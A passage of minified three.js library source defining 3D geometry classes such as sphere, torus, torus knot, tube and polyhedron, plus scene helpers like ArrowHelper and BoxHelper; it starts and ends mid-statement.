f=c+e*p*d,r=Math.sin(f),s=Math.cos(f),f=0;f<=a.length-1;f++)m.x=a[f].x*r,m.y=a[f].y,m.z=a[f].x*s,h.setXYZ(l,m.x,m.y,m.z),q.x=e/b,q.y=f/(a.length-1),k.setXY(l,q.x,q.y),l++;for(e=0;e<b;e++)for(f=0;f<a.length-1;f++)c=f+e*a.length,l=c+a.length,p=c+a.length+1,m=c+1,g.setX(n,c),n++,g.setX(n,l),n++,g.setX(n,m),n++,g.setX(n,l),n++,g.setX(n,p),n++,g.setX(n,m),n++;this.setIndex(g);this.addAttribute(\"position\",h);this.addAttribute(\"uv\",k);this.computeVertexNormals();if(d===2*Math.PI)for(d=\nthis.attributes.normal.array,g=new THREE.Vector3,h=new THREE.Vector3,k=new THREE.Vector3,c=b*a.length*3,f=e=0;e<a.length;e++,f+=3)g.x=d[f+0],g.y=d[f+1],g.z=d[f+2],h.x=d[c+f+0],h.y=d[c+f+1],h.z=d[c+f+2],k.addVectors(g,h).normalize(),d[f+0]=d[c+f+0]=k.x,d[f+1]=d[c+f+1]=k.y,d[f+2]=d[c+f+2]=k.z};THREE.LatheBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.LatheBufferGeometry.prototype.constructor=THREE.LatheBufferGeometry;\nTHREE.LatheGeometry=function(a,b,c,d){THREE.Geometry.call(this);this.type=\"LatheGeometry\";this.parameters={points:a,segments:b,phiStart:c,phiLength:d};this.fromBufferGeometry(new THREE.LatheBufferGeometry(a,b,c,d));this.mergeVertices()};THREE.LatheGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.LatheGeometry.prototype.constructor=THREE.LatheGeometry;\nTHREE.PlaneGeometry=function(a,b,c,d){THREE.Geometry.call(this);this.type=\"PlaneGeometry\";this.parameters={width:a,height:b,widthSegments:c,heightSegments:d};this.fromBufferGeometry(new THREE.PlaneBufferGeometry(a,b,c,d))};THREE.PlaneGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.PlaneGeometry.prototype.constructor=THREE.PlaneGeometry;\nTHREE.PlaneBufferGeometry=function(a,b,c,d){THREE.BufferGeometry.call(this);this.type=\"PlaneBufferGeometry\";this.parameters={width:a,height:b,widthSegments:c,heightSegments:d};var e=a/2,f=b/2;c=Math.floor(c)||1;d=Math.floor(d)||1;var g=c+1,h=d+1,k=a/c,l=b/d;b=new Float32Array(g*h*3);a=new Float32Array(g*h*3);for(var n=new Float32Array(g*h*2),p=0,m=0,q=0;q<h;q++)for(var r=q*l-f,s=0;s<g;s++)b[p]=s*k-e,b[p+1]=-r,a[p+2]=1,n[m]=s/c,n[m+1]=1-q/d,p+=3,m+=2;p=0;e=new (65535<b.length/3?Uint32Array:Uint16Array)(c*\nd*6);for(q=0;q<d;q++)for(s=0;s<c;s++)f=s+g*(q+1),h=s+1+g*(q+1),k=s+1+g*q,e[p]=s+g*q,e[p+1]=f,e[p+2]=k,e[p+3]=f,e[p+4]=h,e[p+5]=k,p+=6;this.setIndex(new THREE.BufferAttribute(e,1));this.addAttribute(\"position\",new THREE.BufferAttribute(b,3));this.addAttribute(\"normal\",new THREE.BufferAttribute(a,3));this.addAttribute(\"uv\",new THREE.BufferAttribute(n,2))};THREE.PlaneBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.PlaneBufferGeometry.prototype.constructor=THREE.PlaneBufferGeometry;\nTHREE.RingBufferGeometry=function(a,b,c,d,e,f){THREE.BufferGeometry.call(this);this.type=\"RingBufferGeometry\";this.parameters={innerRadius:a,outerRadius:b,thetaSegments:c,phiSegments:d,thetaStart:e,thetaLength:f};a=a||20;b=b||50;e=void 0!==e?e:0;f=void 0!==f?f:2*Math.PI;c=void 0!==c?Math.max(3,c):8;d=void 0!==d?Math.max(1,d):1;var g=(c+1)*(d+1),h=c*d*6,h=new THREE.BufferAttribute(new (65535<h?Uint32Array:Uint16Array)(h),1),k=new THREE.BufferAttribute(new Float32Array(3*g),3),l=new THREE.BufferAttribute(new Float32Array(3*\ng),3),g=new THREE.BufferAttribute(new Float32Array(2*g),2),n=0,p=0,m,q=a,r=(b-a)/d,s=new THREE.Vector3,t=new THREE.Vector2,u;for(a=0;a<=d;a++){for(u=0;u<=c;u++)m=e+u/c*f,s.x=q*Math.cos(m),s.y=q*Math.sin(m),k.setXYZ(n,s.x,s.y,s.z),l.setXYZ(n,0,0,1),t.x=(s.x/b+1)/2,t.y=(s.y/b+1)/2,g.setXY(n,t.x,t.y),n++;q+=r}for(a=0;a<d;a++)for(b=a*(c+1),u=0;u<c;u++)e=m=u+b,f=m+c+1,n=m+c+2,m+=1,h.setX(p,e),p++,h.setX(p,f),p++,h.setX(p,n),p++,h.setX(p,e),p++,h.setX(p,n),p++,h.setX(p,m),p++;this.setIndex(h);this.addAttribute(\"position\",\nk);this.addAttribute(\"normal\",l);this.addAttribute(\"uv\",g)};THREE.RingBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.RingBufferGeometry.prototype.constructor=THREE.RingBufferGeometry;THREE.RingGeometry=function(a,b,c,d,e,f){THREE.Geometry.call(this);this.type=\"RingGeometry\";this.parameters={innerRadius:a,outerRadius:b,thetaSegments:c,phiSegments:d,thetaStart:e,thetaLength:f};this.fromBufferGeometry(new THREE.RingBufferGeometry(a,b,c,d,e,f))};\nTHREE.RingGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.RingGeometry.prototype.constructor=THREE.RingGeometry;THREE.SphereGeometry=function(a,b,c,d,e,f,g){THREE.Geometry.call(this);this.type=\"SphereGeometry\";this.parameters={radius:a,widthSegments:b,heightSegments:c,phiStart:d,phiLength:e,thetaStart:f,thetaLength:g};this.fromBufferGeometry(new THREE.SphereBufferGeometry(a,b,c,d,e,f,g))};THREE.SphereGeometry.prototype=Object.create(THREE.Geometry.prototype);\nTHREE.SphereGeometry.prototype.constructor=THREE.SphereGeometry;\nTHREE.SphereBufferGeometry=function(a,b,c,d,e,f,g){THREE.BufferGeometry.call(this);this.type=\"SphereBufferGeometry\";this.parameters={radius:a,widthSegments:b,heightSegments:c,phiStart:d,phiLength:e,thetaStart:f,thetaLength:g};a=a||50;b=Math.max(3,Math.floor(b)||8);c=Math.max(2,Math.floor(c)||6);d=void 0!==d?d:0;e=void 0!==e?e:2*Math.PI;f=void 0!==f?f:0;g=void 0!==g?g:Math.PI;for(var h=f+g,k=(b+1)*(c+1),l=new THREE.BufferAttribute(new Float32Array(3*k),3),n=new THREE.BufferAttribute(new Float32Array(3*\nk),3),k=new THREE.BufferAttribute(new Float32Array(2*k),2),p=0,m=[],q=new THREE.Vector3,r=0;r<=c;r++){for(var s=[],t=r/c,u=0;u<=b;u++){var v=u/b,C=-a*Math.cos(d+v*e)*Math.sin(f+t*g),w=a*Math.cos(f+t*g),E=a*Math.sin(d+v*e)*Math.sin(f+t*g);q.set(C,w,E).normalize();l.setXYZ(p,C,w,E);n.setXYZ(p,q.x,q.y,q.z);k.setXY(p,v,1-t);s.push(p);p++}m.push(s)}d=[];for(r=0;r<c;r++)for(u=0;u<b;u++)e=m[r][u+1],g=m[r][u],p=m[r+1][u],q=m[r+1][u+1],(0!==r||0<f)&&d.push(e,g,q),(r!==c-1||h<Math.PI)&&d.push(g,p,q);this.setIndex(new (65535<\nl.count?THREE.Uint32Attribute:THREE.Uint16Attribute)(d,1));this.addAttribute(\"position\",l);this.addAttribute(\"normal\",n);this.addAttribute(\"uv\",k);this.boundingSphere=new THREE.Sphere(new THREE.Vector3,a)};THREE.SphereBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.SphereBufferGeometry.prototype.constructor=THREE.SphereBufferGeometry;\nTHREE.TextGeometry=function(a,b){b=b||{};var c=b.font;if(!1===c instanceof THREE.Font)return console.error(\"THREE.TextGeometry: font parameter is not an instance of THREE.Font.\"),new THREE.Geometry;c=c.generateShapes(a,b.size,b.curveSegments);b.amount=void 0!==b.height?b.height:50;void 0===b.bevelThickness&&(b.bevelThickness=10);void 0===b.bevelSize&&(b.bevelSize=8);void 0===b.bevelEnabled&&(b.bevelEnabled=!1);THREE.ExtrudeGeometry.call(this,c,b);this.type=\"TextGeometry\"};\nTHREE.TextGeometry.prototype=Object.create(THREE.ExtrudeGeometry.prototype);THREE.TextGeometry.prototype.constructor=THREE.TextGeometry;\nTHREE.TorusBufferGeometry=function(a,b,c,d,e){THREE.BufferGeometry.call(this);this.type=\"TorusBufferGeometry\";this.parameters={radius:a,tube:b,radialSegments:c,tubularSegments:d,arc:e};a=a||100;b=b||40;c=Math.floor(c)||8;d=Math.floor(d)||6;e=e||2*Math.PI;var f=(c+1)*(d+1),g=c*d*6,g=new (65535<g?Uint32Array:Uint16Array)(g),h=new Float32Array(3*f),k=new Float32Array(3*f),f=new Float32Array(2*f),l=0,n=0,p=0,m=new THREE.Vector3,q=new THREE.Vector3,r=new THREE.Vector3,s,t;for(s=0;s<=c;s++)for(t=0;t<=d;t++){var u=\nt/d*e,v=s/c*Math.PI*2;q.x=(a+b*Math.cos(v))*Math.cos(u);q.y=(a+b*Math.cos(v))*Math.sin(u);q.z=b*Math.sin(v);h[l]=q.x;h[l+1]=q.y;h[l+2]=q.z;m.x=a*Math.cos(u);m.y=a*Math.sin(u);r.subVectors(q,m).normalize();k[l]=r.x;k[l+1]=r.y;k[l+2]=r.z;f[n]=t/d;f[n+1]=s/c;l+=3;n+=2}for(s=1;s<=c;s++)for(t=1;t<=d;t++)a=(d+1)*(s-1)+t-1,b=(d+1)*(s-1)+t,e=(d+1)*s+t,g[p]=(d+1)*s+t-1,g[p+1]=a,g[p+2]=e,g[p+3]=a,g[p+4]=b,g[p+5]=e,p+=6;this.setIndex(new THREE.BufferAttribute(g,1));this.addAttribute(\"position\",new THREE.BufferAttribute(h,\n3));this.addAttribute(\"normal\",new THREE.BufferAttribute(k,3));this.addAttribute(\"uv\",new THREE.BufferAttribute(f,2))};THREE.TorusBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.TorusBufferGeometry.prototype.constructor=THREE.TorusBufferGeometry;\nTHREE.TorusGeometry=function(a,b,c,d,e){THREE.Geometry.call(this);this.type=\"TorusGeometry\";this.parameters={radius:a,tube:b,radialSegments:c,tubularSegments:d,arc:e};this.fromBufferGeometry(new THREE.TorusBufferGeometry(a,b,c,d,e))};THREE.TorusGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.TorusGeometry.prototype.constructor=THREE.TorusGeometry;\nTHREE.TorusKnotBufferGeometry=function(a,b,c,d,e,f){function g(a,b,c,d,e){var f=Math.cos(a),g=Math.sin(a);a*=c/b;b=Math.cos(a);e.x=d*(2+b)*.5*f;e.y=d*(2+b)*g*.5;e.z=d*Math.sin(a)*.5}THREE.BufferGeometry.call(this);this.type=\"TorusKnotBufferGeometry\";this.parameters={radius:a,tube:b,tubularSegments:c,radialSegments:d,p:e,q:f};a=a||100;b=b||40;c=Math.floor(c)||64;d=Math.floor(d)||8;e=e||2;f=f||3;var h=(d+1)*(c+1),k=d*c*6,k=new THREE.BufferAttribute(new (65535<k?Uint32Array:Uint16Array)(k),1),l=new THREE.BufferAttribute(new Float32Array(3*\nh),3),n=new THREE.BufferAttribute(new Float32Array(3*h),3),h=new THREE.BufferAttribute(new Float32Array(2*h),2),p,m,q=0,r=0,s=new THREE.Vector3,t=new THREE.Vector3,u=new THREE.Vector2,v=new THREE.Vector3,C=new THREE.Vector3,w=new THREE.Vector3,E=new THREE.Vector3,z=new THREE.Vector3;for(p=0;p<=c;++p)for(m=p/c*e*Math.PI*2,g(m,e,f,a,v),g(m+.01,e,f,a,C),E.subVectors(C,v),z.addVectors(C,v),w.crossVectors(E,z),z.crossVectors(w,E),w.normalize(),z.normalize(),m=0;m<=d;++m){var y=m/d*Math.PI*2,A=-b*Math.cos(y),\ny=b*Math.sin(y);s.x=v.x+(A*z.x+y*w.x);s.y=v.y+(A*z.y+y*w.y);s.z=v.z+(A*z.z+y*w.z);l.setXYZ(q,s.x,s.y,s.z);t.subVectors(s,v).normalize();n.setXYZ(q,t.x,t.y,t.z);u.x=p/c;u.y=m/d;h.setXY(q,u.x,u.y);q++}for(m=1;m<=c;m++)for(p=1;p<=d;p++)a=(d+1)*m+(p-1),b=(d+1)*m+p,e=(d+1)*(m-1)+p,k.setX(r,(d+1)*(m-1)+(p-1)),r++,k.setX(r,a),r++,k.setX(r,e),r++,k.setX(r,a),r++,k.setX(r,b),r++,k.setX(r,e),r++;this.setIndex(k);this.addAttribute(\"position\",l);this.addAttribute(\"normal\",n);this.addAttribute(\"uv\",h)};\nTHREE.TorusKnotBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.TorusKnotBufferGeometry.prototype.constructor=THREE.TorusKnotBufferGeometry;\nTHREE.TorusKnotGeometry=function(a,b,c,d,e,f,g){THREE.Geometry.call(this);this.type=\"TorusKnotGeometry\";this.parameters={radius:a,tube:b,tubularSegments:c,radialSegments:d,p:e,q:f};void 0!==g&&console.warn(\"THREE.TorusKnotGeometry: heightScale has been deprecated. Use .scale( x, y, z ) instead.\");this.fromBufferGeometry(new THREE.TorusKnotBufferGeometry(a,b,c,d,e,f));this.mergeVertices()};THREE.TorusKnotGeometry.prototype=Object.create(THREE.Geometry.prototype);\nTHREE.TorusKnotGeometry.prototype.constructor=THREE.TorusKnotGeometry;\nTHREE.TubeGeometry=function(a,b,c,d,e,f){THREE.Geometry.call(this);this.type=\"TubeGeometry\";this.parameters={path:a,segments:b,radius:c,radialSegments:d,closed:e,taper:f};b=b||64;c=c||1;d=d||8;e=e||!1;f=f||THREE.TubeGeometry.NoTaper;var g=[],h,k,l=b+1,n,p,m,q,r,s=new THREE.Vector3,t,u,v;t=new THREE.TubeGeometry.FrenetFrames(a,b,e);u=t.normals;v=t.binormals;this.tangents=t.tangents;this.normals=u;this.binormals=v;for(t=0;t<l;t++)for(g[t]=[],n=t/(l-1),r=a.getPointAt(n),h=u[t],k=v[t],m=c*f(n),n=0;n<\nd;n++)p=n/d*2*Math.PI,q=-m*Math.cos(p),p=m*Math.sin(p),s.copy(r),s.x+=q*h.x+p*k.x,s.y+=q*h.y+p*k.y,s.z+=q*h.z+p*k.z,g[t][n]=this.vertices.push(new THREE.Vector3(s.x,s.y,s.z))-1;for(t=0;t<b;t++)for(n=0;n<d;n++)f=e?(t+1)%b:t+1,l=(n+1)%d,a=g[t][n],c=g[f][n],f=g[f][l],l=g[t][l],s=new THREE.Vector2(t/b,n/d),u=new THREE.Vector2((t+1)/b,n/d),v=new THREE.Vector2((t+1)/b,(n+1)/d),h=new THREE.Vector2(t/b,(n+1)/d),this.faces.push(new THREE.Face3(a,c,l)),this.faceVertexUvs[0].push([s,u,h]),this.faces.push(new THREE.Face3(c,\nf,l)),this.faceVertexUvs[0].push([u.clone(),v,h.clone()]);this.computeFaceNormals();this.computeVertexNormals()};THREE.TubeGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.TubeGeometry.prototype.constructor=THREE.TubeGeometry;THREE.TubeGeometry.NoTaper=function(a){return 1};THREE.TubeGeometry.SinusoidalTaper=function(a){return Math.sin(Math.PI*a)};\nTHREE.TubeGeometry.FrenetFrames=function(a,b,c){var d=new THREE.Vector3,e=[],f=[],g=[],h=new THREE.Vector3,k=new THREE.Matrix4;b+=1;var l,n,p;this.tangents=e;this.normals=f;this.binormals=g;for(l=0;l<b;l++)n=l/(b-1),e[l]=a.getTangentAt(n),e[l].normalize();f[0]=new THREE.Vector3;g[0]=new THREE.Vector3;a=Number.MAX_VALUE;l=Math.abs(e[0].x);n=Math.abs(e[0].y);p=Math.abs(e[0].z);l<=a&&(a=l,d.set(1,0,0));n<=a&&(a=n,d.set(0,1,0));p<=a&&d.set(0,0,1);h.crossVectors(e[0],d).normalize();f[0].crossVectors(e[0],\nh);g[0].crossVectors(e[0],f[0]);for(l=1;l<b;l++)f[l]=f[l-1].clone(),g[l]=g[l-1].clone(),h.crossVectors(e[l-1],e[l]),h.length()>Number.EPSILON&&(h.normalize(),d=Math.acos(THREE.Math.clamp(e[l-1].dot(e[l]),-1,1)),f[l].applyMatrix4(k.makeRotationAxis(h,d))),g[l].crossVectors(e[l],f[l]);if(c)for(d=Math.acos(THREE.Math.clamp(f[0].dot(f[b-1]),-1,1)),d/=b-1,0<e[0].dot(h.crossVectors(f[0],f[b-1]))&&(d=-d),l=1;l<b;l++)f[l].applyMatrix4(k.makeRotationAxis(e[l],d*l)),g[l].crossVectors(e[l],f[l])};\nTHREE.PolyhedronGeometry=function(a,b,c,d){function e(a){var b=a.normalize().clone();b.index=k.vertices.push(b)-1;var c=Math.atan2(a.z,-a.x)/2/Math.PI+.5;a=Math.atan2(-a.y,Math.sqrt(a.x*a.x+a.z*a.z))/Math.PI+.5;b.uv=new THREE.Vector2(c,1-a);return b}function f(a,b,c){var d=new THREE.Face3(a.index,b.index,c.index,[a.clone(),b.clone(),c.clone()]);k.faces.push(d);t.copy(a).add(b).add(c).divideScalar(3);d=Math.atan2(t.z,-t.x);k.faceVertexUvs[0].push([h(a.uv,a,d),h(b.uv,b,d),h(c.uv,c,d)])}function g(a,\nb){for(var c=Math.pow(2,b),d=e(k.vertices[a.a]),g=e(k.vertices[a.b]),h=e(k.vertices[a.c]),l=[],m=0;m<=c;m++){l[m]=[];for(var n=e(d.clone().lerp(h,m/c)),p=e(g.clone().lerp(h,m/c)),q=c-m,r=0;r<=q;r++)l[m][r]=0===r&&m===c?n:e(n.clone().lerp(p,r/q))}for(m=0;m<c;m++)for(r=0;r<2*(c-m)-1;r++)d=Math.floor(r/2),0===r%2?f(l[m][d+1],l[m+1][d],l[m][d]):f(l[m][d+1],l[m+1][d+1],l[m+1][d])}function h(a,b,c){0>c&&1===a.x&&(a=new THREE.Vector2(a.x-1,a.y));0===b.x&&0===b.z&&(a=new THREE.Vector2(c/2/Math.PI+.5,a.y));\nreturn a.clone()}THREE.Geometry.call(this);this.type=\"PolyhedronGeometry\";this.parameters={vertices:a,indices:b,radius:c,detail:d};c=c||1;d=d||0;for(var k=this,l=0,n=a.length;l<n;l+=3)e(new THREE.Vector3(a[l],a[l+1],a[l+2]));a=this.vertices;for(var p=[],m=l=0,n=b.length;l<n;l+=3,m++){var q=a[b[l]],r=a[b[l+1]],s=a[b[l+2]];p[m]=new THREE.Face3(q.index,r.index,s.index,[q.clone(),r.clone(),s.clone()])}for(var t=new THREE.Vector3,l=0,n=p.length;l<n;l++)g(p[l],d);l=0;for(n=this.faceVertexUvs[0].length;l<\nn;l++)b=this.faceVertexUvs[0][l],d=b[0].x,a=b[1].x,p=b[2].x,m=Math.max(d,a,p),q=Math.min(d,a,p),.9<m&&.1>q&&(.2>d&&(b[0].x+=1),.2>a&&(b[1].x+=1),.2>p&&(b[2].x+=1));l=0;for(n=this.vertices.length;l<n;l++)this.vertices[l].multiplyScalar(c);this.mergeVertices();this.computeFaceNormals();this.boundingSphere=new THREE.Sphere(new THREE.Vector3,c)};THREE.PolyhedronGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.PolyhedronGeometry.prototype.constructor=THREE.PolyhedronGeometry;\nTHREE.DodecahedronGeometry=function(a,b){var c=(1+Math.sqrt(5))/2,d=1/c;THREE.PolyhedronGeometry.call(this,[-1,-1,-1,-1,-1,1,-1,1,-1,-1,1,1,1,-1,-1,1,-1,1,1,1,-1,1,1,1,0,-d,-c,0,-d,c,0,d,-c,0,d,c,-d,-c,0,-d,c,0,d,-c,0,d,c,0,-c,0,-d,c,0,-d,-c,0,d,c,0,d],[3,11,7,3,7,15,3,15,13,7,19,17,7,17,6,7,6,15,17,4,8,17,8,10,17,10,6,8,0,16,8,16,2,8,2,10,0,12,1,0,1,18,0,18,16,6,10,2,6,2,13,6,13,15,2,16,18,2,18,3,2,3,13,18,1,9,18,9,11,18,11,3,4,14,12,4,12,0,4,0,8,11,9,5,11,5,19,11,19,7,19,5,14,19,14,4,19,4,17,1,\n12,14,1,14,5,1,5,9],a,b);this.type=\"DodecahedronGeometry\";this.parameters={radius:a,detail:b}};THREE.DodecahedronGeometry.prototype=Object.create(THREE.PolyhedronGeometry.prototype);THREE.DodecahedronGeometry.prototype.constructor=THREE.DodecahedronGeometry;\nTHREE.IcosahedronGeometry=function(a,b){var c=(1+Math.sqrt(5))/2;THREE.PolyhedronGeometry.call(this,[-1,c,0,1,c,0,-1,-c,0,1,-c,0,0,-1,c,0,1,c,0,-1,-c,0,1,-c,c,0,-1,c,0,1,-c,0,-1,-c,0,1],[0,11,5,0,5,1,0,1,7,0,7,10,0,10,11,1,5,9,5,11,4,11,10,2,10,7,6,7,1,8,3,9,4,3,4,2,3,2,6,3,6,8,3,8,9,4,9,5,2,4,11,6,2,10,8,6,7,9,8,1],a,b);this.type=\"IcosahedronGeometry\";this.parameters={radius:a,detail:b}};THREE.IcosahedronGeometry.prototype=Object.create(THREE.PolyhedronGeometry.prototype);\nTHREE.IcosahedronGeometry.prototype.constructor=THREE.IcosahedronGeometry;THREE.OctahedronGeometry=function(a,b){THREE.PolyhedronGeometry.call(this,[1,0,0,-1,0,0,0,1,0,0,-1,0,0,0,1,0,0,-1],[0,2,4,0,4,3,0,3,5,0,5,2,1,2,5,1,5,3,1,3,4,1,4,2],a,b);this.type=\"OctahedronGeometry\";this.parameters={radius:a,detail:b}};THREE.OctahedronGeometry.prototype=Object.create(THREE.PolyhedronGeometry.prototype);THREE.OctahedronGeometry.prototype.constructor=THREE.OctahedronGeometry;\nTHREE.TetrahedronGeometry=function(a,b){THREE.PolyhedronGeometry.call(this,[1,1,1,-1,-1,1,-1,1,-1,1,-1,-1],[2,1,0,0,3,2,1,3,0,2,3,1],a,b);this.type=\"TetrahedronGeometry\";this.parameters={radius:a,detail:b}};THREE.TetrahedronGeometry.prototype=Object.create(THREE.PolyhedronGeometry.prototype);THREE.TetrahedronGeometry.prototype.constructor=THREE.TetrahedronGeometry;\nTHREE.ParametricGeometry=function(a,b,c){THREE.Geometry.call(this);this.type=\"ParametricGeometry\";this.parameters={func:a,slices:b,stacks:c};var d=this.vertices,e=this.faces,f=this.faceVertexUvs[0],g,h,k,l,n=b+1;for(g=0;g<=c;g++)for(l=g/c,h=0;h<=b;h++)k=h/b,k=a(k,l),d.push(k);var p,m,q,r;for(g=0;g<c;g++)for(h=0;h<b;h++)a=g*n+h,d=g*n+h+1,l=(g+1)*n+h+1,k=(g+1)*n+h,p=new THREE.Vector2(h/b,g/c),m=new THREE.Vector2((h+1)/b,g/c),q=new THREE.Vector2((h+1)/b,(g+1)/c),r=new THREE.Vector2(h/b,(g+1)/c),e.push(new THREE.Face3(a,\nd,k)),f.push([p,m,r]),e.push(new THREE.Face3(d,l,k)),f.push([m.clone(),q,r.clone()]);this.computeFaceNormals();this.computeVertexNormals()};THREE.ParametricGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.ParametricGeometry.prototype.constructor=THREE.ParametricGeometry;\nTHREE.WireframeGeometry=function(a){function b(a,b){return a-b}THREE.BufferGeometry.call(this);var c=[0,0],d={},e=[\"a\",\"b\",\"c\"];if(a instanceof THREE.Geometry){var f=a.vertices,g=a.faces,h=0,k=new Uint32Array(6*g.length);a=0;for(var l=g.length;a<l;a++)for(var n=g[a],p=0;3>p;p++){c[0]=n[e[p]];c[1]=n[e[(p+1)%3]];c.sort(b);var m=c.toString();void 0===d[m]&&(k[2*h]=c[0],k[2*h+1]=c[1],d[m]=!0,h++)}c=new Float32Array(6*h);a=0;for(l=h;a<l;a++)for(p=0;2>p;p++)d=f[k[2*a+p]],h=6*a+3*p,c[h+0]=d.x,c[h+1]=d.y,\nc[h+2]=d.z;this.addAttribute(\"position\",new THREE.BufferAttribute(c,3))}else if(a instanceof THREE.BufferGeometry){if(null!==a.index){l=a.index.array;f=a.attributes.position;e=a.groups;h=0;0===e.length&&a.addGroup(0,l.length);k=new Uint32Array(2*l.length);g=0;for(n=e.length;g<n;++g){a=e[g];p=a.start;m=a.count;a=p;for(var q=p+m;a<q;a+=3)for(p=0;3>p;p++)c[0]=l[a+p],c[1]=l[a+(p+1)%3],c.sort(b),m=c.toString(),void 0===d[m]&&(k[2*h]=c[0],k[2*h+1]=c[1],d[m]=!0,h++)}c=new Float32Array(6*h);a=0;for(l=h;a<\nl;a++)for(p=0;2>p;p++)h=6*a+3*p,d=k[2*a+p],c[h+0]=f.getX(d),c[h+1]=f.getY(d),c[h+2]=f.getZ(d)}else for(f=a.attributes.position.array,h=f.length/3,k=h/3,c=new Float32Array(6*h),a=0,l=k;a<l;a++)for(p=0;3>p;p++)h=18*a+6*p,k=9*a+3*p,c[h+0]=f[k],c[h+1]=f[k+1],c[h+2]=f[k+2],d=9*a+(p+1)%3*3,c[h+3]=f[d],c[h+4]=f[d+1],c[h+5]=f[d+2];this.addAttribute(\"position\",new THREE.BufferAttribute(c,3))}};THREE.WireframeGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);\nTHREE.WireframeGeometry.prototype.constructor=THREE.WireframeGeometry;THREE.AxisHelper=function(a){a=a||1;var b=new Float32Array([0,0,0,a,0,0,0,0,0,0,a,0,0,0,0,0,0,a]),c=new Float32Array([1,0,0,1,.6,0,0,1,0,.6,1,0,0,0,1,0,.6,1]);a=new THREE.BufferGeometry;a.addAttribute(\"position\",new THREE.BufferAttribute(b,3));a.addAttribute(\"color\",new THREE.BufferAttribute(c,3));b=new THREE.LineBasicMaterial({vertexColors:THREE.VertexColors});THREE.LineSegments.call(this,a,b)};THREE.AxisHelper.prototype=Object.create(THREE.LineSegments.prototype);\nTHREE.AxisHelper.prototype.constructor=THREE.AxisHelper;\nTHREE.ArrowHelper=function(){var a=new THREE.BufferGeometry;a.addAttribute(\"position\",new THREE.Float32Attribute([0,0,0,0,1,0],3));var b=new THREE.CylinderBufferGeometry(0,.5,1,5,1);b.translate(0,-.5,0);return function(c,d,e,f,g,h){THREE.Object3D.call(this);void 0===f&&(f=16776960);void 0===e&&(e=1);void 0===g&&(g=.2*e);void 0===h&&(h=.2*g);this.position.copy(d);this.line=new THREE.Line(a,new THREE.LineBasicMaterial({color:f}));this.line.matrixAutoUpdate=!1;this.add(this.line);this.cone=new THREE.Mesh(b,\nnew THREE.MeshBasicMaterial({color:f}));this.cone.matrixAutoUpdate=!1;this.add(this.cone);this.setDirection(c);this.setLength(e,g,h)}}();THREE.ArrowHelper.prototype=Object.create(THREE.Object3D.prototype);THREE.ArrowHelper.prototype.constructor=THREE.ArrowHelper;\nTHREE.ArrowHelper.prototype.setDirection=function(){var a=new THREE.Vector3,b;return function(c){.99999<c.y?this.quaternion.set(0,0,0,1):-.99999>c.y?this.quaternion.set(1,0,0,0):(a.set(c.z,0,-c.x).normalize(),b=Math.acos(c.y),this.quaternion.setFromAxisAngle(a,b))}}();THREE.ArrowHelper.prototype.setLength=function(a,b,c){void 0===b&&(b=.2*a);void 0===c&&(c=.2*b);this.line.scale.set(1,Math.max(0,a-b),1);this.line.updateMatrix();this.cone.scale.set(c,b,c);this.cone.position.y=a;this.cone.updateMatrix()};\nTHREE.ArrowHelper.prototype.setColor=function(a){this.line.material.color.copy(a);this.cone.material.color.copy(a)};THREE.BoxHelper=function(a,b){void 0===b&&(b=16776960);var c=new Uint16Array([0,1,1,2,2,3,3,0,4,5,5,6,6,7,7,4,0,4,1,5,2,6,3,7]),d=new Float32Array(24),e=new THREE.BufferGeometry;e.setIndex(new THREE.BufferAttribute(c,1));e.addAttribute(\"position\",new THREE.BufferAttribute(d,3));THREE.LineSegments.call(this,e,new THREE.LineBasicMaterial({color:b}));void 0!==a&&this.update(a)};\nTHREE.BoxHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.BoxHelper.prototype.constructor=THREE.BoxHelper;\nTHREE.BoxHelper.prototype.update=function(){var a=new THREE.Box3;return function(b){b instanceof THREE.Box3?a.copy(b):a.setFromObject(b);if(!a.isEmpty()){b=a.min;var c=a.max,d=this.geometry.attributes.position,e=d.array;e[0]=c.x;e[1]=c.y;e[2]=c.z;e[3]=b.x;e[4]=c.y;e[5]=c.z;e[6]=b.x;e[7]=b.y;e[8]=c.z;e[9]=c.x;e[10]=b.y;e[11]=c.z;e[12]=c.x;e[13]=c.y;e[14]=b.z;e[15]=b.x;e[16]=c.y;e[17]=b.z;e[18]=b.x;e[19]=b.y;e[20]=b.z;e[21]=c.x;e[22]=b.y;e[23]=b.z;d.needsUpdate=!0;this.geometry.computeBoundingSphere()}}}();\nTHREE.BoundingBoxHelper=function(a,b){var c=void 0!==b?b:8947848;this.object=a;this.box=new THREE.Box3;THREE.Mesh.call(this,new THREE.BoxGeometry(1,1,1),new THREE.MeshBasicMaterial({color:c,wireframe:!0}))};THREE.BoundingBoxHelper.prototype=Object.create(THREE.Mesh.prototype);THREE.BoundingBoxHelper.prototype.constructor=THREE.BoundingBoxHelper;THREE.BoundingBoxHelper.prototype.update=function(){this.box.setFromObject(this.object);this.box.size(this.scale);this.box.center(this.position)};\nTHREE.CameraHelper=function(a){function b(a,b,d){c(a,d);c(b,d)}function c(a,b){d.vertices.push(new THREE.Vector3);d.colors.push(new THREE.Color(b));void 0===f[a]&&(f[a]=[]);f[a].push(d.vertices.length-1)}var d=new THREE.Geometry,e=new 